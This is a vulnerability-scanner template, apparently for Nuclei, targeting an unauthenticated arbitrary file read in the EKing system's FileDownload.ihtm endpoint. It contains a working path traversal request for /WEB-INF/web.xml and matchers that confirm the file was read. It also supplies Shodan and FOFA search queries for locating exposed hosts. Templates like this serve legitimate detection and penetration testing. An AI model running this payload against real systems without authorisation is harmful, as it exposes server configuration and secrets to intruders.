id: EKing-FileDownload-ReadAnyFile

info:
  name: EKing FileDownload Arbitrary File Read
  author: iSee857
  severity: high
  description: |
    EKing system contains a file read vulnerability in the FileDownload.ihtm endpoint
    that allows unauthenticated attackers to read arbitrary files via path traversal.
  reference:
    - 
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"EKing"
    fofa-query: title="EKing"
  tags: eking,lfi,file-read,intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/FileDownload.ihtm?file_name=/WEB-INF/web.xml"

    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "<?xml"
        part: body
